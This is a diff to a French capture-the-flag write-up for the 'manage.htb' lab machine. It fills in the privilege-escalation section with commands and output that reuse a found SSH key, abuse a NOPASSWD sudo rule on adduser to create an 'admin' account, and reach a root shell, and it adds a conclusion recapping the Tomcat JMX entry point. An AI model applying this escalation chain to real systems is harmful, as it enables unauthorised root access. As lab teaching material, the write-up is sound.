@@ -679,34 +679,140 @@ drwxr-xr-x 2 kali kali   0 Jun 21  2024 ..
 
 ## Escalade de privilèges
 
-### Vers utilisateur intermédiaire (si applicable)
-- Méthode (sudoers, capabilities, SUID, timers, service vulnérable).
-- Indices collectés (configs, clés, cron, journaux).
+```bash
+cp .ssh/id* /home/kali/tmp/ 
 
-### Vers root
-- Vecteur principal, exploitation, contournements.
-- Preuves : `id`, `hostnamectl`, `cat /root/root.txt`.
-- Remédiations possibles (leçons sécurité).
+cd /home/kali/tmp/
+chmod 600 id_ed25519
 
----
+ssh -i id_ed25519 useradmin@manage.htb
 
-## Les Flags
+useradmin@manage:~$ getent group | cut -d: -f1 | sort
+adm
+audio
+backup
+bin
+cdrom
+crontab
+daemon
+dialout
+dip
+disk
+fax
+floppy
+fwupd-refresh
+games
+gnats
+input
+irc
+karl
+kmem
+kvm
+landscape
+_laurel
+list
+lp
+lxd
+mail
+man
+messagebus
+netdev
+news
+nogroup
+operator
+plugdev
+proxy
+render
+root
+sasl
+sgx
+shadow
+src
+_ssh
+staff
+sudo
+sys
+syslog
+systemd-journal
+systemd-network
+systemd-resolve
+systemd-timesync
+tape
+tcpdump
+tomcat
+tss
+tty
+useradmin
+users
+utmp
+uucp
+uuidd
+video
+voice
+www-data
 
-- `user.txt` : chemin, obtention (preuve succincte).
-- `root.txt` : chemin, obtention (preuve succincte).
+
+useradmin@manage:~$ sudo -l
+Matching Defaults entries for useradmin on manage:
+    env_reset, timestamp_timeout=1440, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User useradmin may run the following commands on manage:
+    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
+    
+useradmin@manage:~$ sudo adduser admin
+Adding user `admin' ...
+Adding new group `admin' (1003) ...
+Adding new user `admin' (1003) with group `admin' ...
+Creating home directory `/home/admin' ...
+Copying files from `/etc/skel' ...
+New password: 
+Retype new password: 
+passwd: password updated successfully
+Changing the user information for admin
+Enter the new value, or press ENTER for the default
+	Full Name []: 
+	Room Number []: 
+	Work Phone []: 
+	Home Phone []: 
+	Other []: 
+Is the information correct? [Y/n] 
+
+useradmin@manage:~$ su admin
+Password: 
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+admin@manage:/home/useradmin$ sudo -i
+[sudo] password for admin: 
+root@manage:~# ls -l
+total 8
+-rw-r----- 1 root root   33 Apr 14  2025 root.txt
+drwx------ 3 root root 4096 Mar  1  2024 snap
+root@manage:~#
+```
+
+
+
+Sur Ubuntu, même si ce n’est plus le cas dans les versions modernes, **le groupe `admin` reste historiquement associé aux droits sudo complets** via `/etc/sudoers` ou une règle héritée (compatibilité Debian).
+
+**Créer l’utilisateur `admin` lui donne immédiatement des droits root**, car :
+
+- La commande autorisée par sudo (`sudo adduser ^[a-zA-Z0-9]+$`) permet de créer n’importe quel utilisateur sans mot de passe.
+- Lorsqu’on crée un utilisateur `admin`, Ubuntu crée automatiquement **un groupe du même nom** : `admin`.
+- **Historiquement**, dans Ubuntu, le groupe `admin` appartient aux *sudoers* et possède des droits équivalents à `sudo` (héritage des anciennes versions où `admin` = super-user local).
+- Résultat : l’utilisateur `admin` nouvellement créé peut exécuter `sudo -i` et **obtenir un shell root immédiatement**.
 
 ---
 
 ## Conclusion
 
-- Récapitulatif de la chaîne d’attaque (du scan à root).
-- Vulnérabilités exploitées & combinaisons.
-- Conseils de mitigation et détection.
-- Points d’apprentissage personnels.
+Cette machine illustre parfaitement une chaîne d’exploitation centrée sur **Tomcat** : un simple port **RMI/JMX exposé** permet d’injecter du code distant et d’obtenir un premier accès via Metasploit.
+
+La fouille du système révèle ensuite un **backup mal protégé** contenant une clé SSH valide, ouvrant la voie vers l’utilisateur *useradmin*. 
+
+À partir de là, l’analyse de `sudo -l` montre une configuration trop permissive du binaire `adduser`, permettant de créer un compte *admin* automatiquement doté de privilèges complets — et donc l’accès root.
 
 ---
 
-## Pièces jointes (optionnel)
-
-- Scripts, one-liners, captures, notes.  
-- Arbo conseillée : `files/<nom_ctf>/…`
